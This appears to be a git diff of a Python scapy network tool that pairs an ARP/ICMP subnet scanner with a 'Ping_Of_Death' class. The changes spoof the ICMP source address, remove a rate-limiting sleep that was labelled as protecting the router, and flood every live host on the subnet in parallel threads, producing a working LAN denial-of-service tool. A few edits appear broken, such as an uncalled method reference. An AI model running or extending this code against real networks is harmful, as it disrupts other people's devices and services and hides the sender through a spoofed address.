@@ -17,7 +17,7 @@ from nsm_utilities import Utilities, NetTilities
 
 # NETWORK IMPORTS
 import socket, ipaddress
-from scapy.all import ARP, ICMP, sendp, conf, ICMP, sr1, IP, send, ARP, Ether, srp
+from scapy.all import ARP, ICMP, sendp, conf, ICMP, sr1, IP, send, ARP, Ether, srp, getmacbyip
 
 
 # ETC IMPORTS
@@ -43,7 +43,7 @@ class Ping_Of_Death():
 
         
         # CREATE THE ICMP PACKET
-        icmp = IP(dst=target_ip) / ICMP()
+        icmp = IP(dst=target_ip, src="192.168.1.38") / ICMP()
         
 
         # SEND THE ICMP PACKET
@@ -52,12 +52,12 @@ class Ping_Of_Death():
 
             self.packets_sent += count
 
-            console.print(f"Total Packets Sent: {self.packets_sent}")
+            console.print(f"Total Packets Sent: {self.packets_sent} to: {target_ip}")
              
             
 
             # FOR TESTING PURPOSES // DONT OVERLOAD THROUGHPUT / ROUTER
-            time.sleep(3)
+            #time.sleep(3)
 
 
 
@@ -93,7 +93,6 @@ class Network_Scanner():
                 console.print("[bold red]Exception Error: [yellow]",e)
 
     
-
     
     # WARNING THIS CAN DRAW ALOT OF RESOURCES DEPENDING ON THE SUBNET SIZE PROCCEDD WITH CAUTION
     
@@ -103,15 +102,14 @@ class Network_Scanner():
 
         # CREATE VARIABLES
         threads = []
-        subnet = Network_Scanner.get_subnet()
         num = 0
 
 
-        subnet_str = [str(ip) for ip in subnet]
+        subnet = [str(ip) for ip in Network_Scanner.get_subnet()]
 
 
         # ITERATE THROUGH SUBNET
-        for ip in subnet_str:
+        for ip in subnet:
 
             t = threading.Thread(target=target, args=(ip, ), daemon=True)
             threads.append(t)
@@ -199,6 +197,7 @@ class Network_ICMP_Scanner():
     """This will perform a network wide scan using ICMP packets instead of ARP"""
 
     def __init__(self):
+        self.map = Network_Scanner()
         pass
 
 
@@ -206,15 +205,12 @@ class Network_ICMP_Scanner():
         """This is where we will create and send the icmp packet"""
 
         response = False
-    
+        
         icmp = IP(dst=target_ip) / ICMP()
-        
-        thread_id = threading.current_thread().name
-        active_threads = threading.active_count()
-        console.print(f"On thread: {thread_id} Thread count: {active_threads}")
-        
+         
         try:
-            response = sr1(icmp, verbose=0, timeout=1)
+            conf.verb = 0
+            response = sr1(icmp, verbose=0, timeout=1.5)
 
             if response:
                 console.print(f"[bold blue]IP:[/bold blue] {target_ip} is [bold green]Online")
@@ -257,33 +253,31 @@ class Network_ICMP_Scanner():
     def threader(self):
         """This will be responsible for creating a thread for each ip in the subnet"""
 
-        threads = []
-        subnet = Network_Scanner.get_subnet()
-
-        subnet_str = [str(ip) for ip in subnet]
+        threads = [] 
+        subnet = [str(ip) for ip in Network_Scanner.get_subnet()]
         
         try:
-            for ip in subnet_str:
+            for ip in subnet:
                 
-
-                t = threading.Thread(target=self.icmp, args=(ip, ), daemon=True)
+                t = threading.Thread(target=self.map.arp_scanner, args=(ip, ), daemon=True)
+                #t = threading.Thread(target=self.icmp, args=(ip, ), daemon=True)
                 #t = threading.Thread(target=self.tcp, args=(ip, ), daemon=True)
-                
-                console.print(ip)
+                #console.print(ip)
+
                 threads.append(t)
 
             
             for thread in threads:
+                
                 thread.start()
-                console.print(threading.active_count)
-
+                
             
             for thread in threads:
                 thread.join()
 
 
-            
-            console.print("\n\n\nExit to Enter: ")
+            self.map.tester()
+            console.input("\n\n\nExit to Enter: ")
         
         except Exception as e:
             console.print(e)
@@ -303,14 +297,34 @@ class Module_Controller():
     def main():
         """Begin"""
 
-        use = 2
+        use = 1
 
         # GET ACTIVE IPS ALONG WITH THERE MACS
         if use == 1:
             ips, macs = Network_Scanner.main()
+            ping_o = Ping_Of_Death()
+             
+            console.print("starting ping of death")
+            
+            threads =  []
+           
+            try:
+                for ip in ips:
+                    t = threading.Thread(target=Ping_Of_Death().icmp, args=(ip, ), daemon=True)
+                    threads.append(t)
 
-            for ip in ips:
-                Ping_Of_Death.icmp(target_ip=ip)
+                for thread in threads:
+                    thread.start()
+                
+                for thread in threads:
+                    thread.join()
+            
+            except KeyboardInterrupt as e:
+                console.print(e)
+
+            
+            except Exception as e:
+                console.print(e)
         
         elif use == 2:
             Network_ICMP_Scanner().threader()
@@ -330,7 +344,9 @@ if __name__ == "__main__":
     use = 3
 
     if use == 1:
-        Ping_Of_Death().icmp(target_ip="192.168.1.1")
+        ips = [ip.strip() for ip in Network_Scanner.get_subnet()]
+        for ip in ips:
+            Network_Scanner.arp_scanner
     
 
     elif use == 2:
